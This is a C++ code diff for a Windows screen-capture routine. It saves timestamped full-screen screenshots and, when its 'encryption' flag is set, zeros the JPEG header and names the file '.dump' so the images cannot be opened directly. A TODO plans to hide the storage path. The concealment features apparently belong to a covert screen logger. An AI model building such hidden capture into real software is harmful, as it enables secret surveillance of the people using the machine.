@@ -55,10 +55,7 @@ void BitmapToJpg(HBITMAP hbmpImage, int width, int height, LPCWSTR filename, ULO
 	else
 		std::cout << "Encoder failed" << std::endl;
 	p_bmp->Save(filename, &pngClsid, &encoderParams);
-	//TODO make the file unable to be opened directly,
-	//such as modify the JPEG file header (the first 9 bytes) and change the file extension
 	delete p_bmp;
-	removeJpegHeader((const char*)filename);
 }
 
 void getDirectoryPath(CString &strCurPath) {
@@ -86,23 +83,30 @@ bool ScreenCapture(int x, int y, int width, int height, LPCWSTR filename, ULONG 
 	return true;
 }
 
-void removeJpegHeader(const char* filename) {
-
+void fillJpegHeaderWithZero(LPCTSTR filename) {
+	//byte originaHeader[] = { 0xFF,0xD8,0xFF,0xE0,0x00,0x10,0x4A,0x46,0x49,0x46 };
+	byte padding[] = { 0,0,0,0,0,0,0,0,0,0 };
+	CFile jpegFile;
+	jpegFile.Open(filename, CFile::modeWrite | CFile::modeNoTruncate | CFile::typeBinary, NULL);
+	jpegFile.Write(padding, 10);
+	jpegFile.Close();
 }
 
-void work(CString filename)
+void work(CString filename, bool encryption)
 {
 	char *time = new char[20];
 	getNowTime(time);
 	filename += time;
-	filename += ".dump";
-	//TODO obscure the file name and directory path
+	filename += encryption ? ".dump" : ".jpg";
+	//TODO obscure the directory path
 
 	int width = GetSystemMetrics(SM_CXSCREEN);
 	int height = GetSystemMetrics(SM_CYSCREEN);
 
 	std::cout << filename.GetString() << std::endl;
 	ScreenCapture(0, 0, width, height, filename.GetString(), 100L);
-
+	if (encryption) {
+		fillJpegHeaderWithZero(filename.GetString());
+	}
 	delete time;
 }
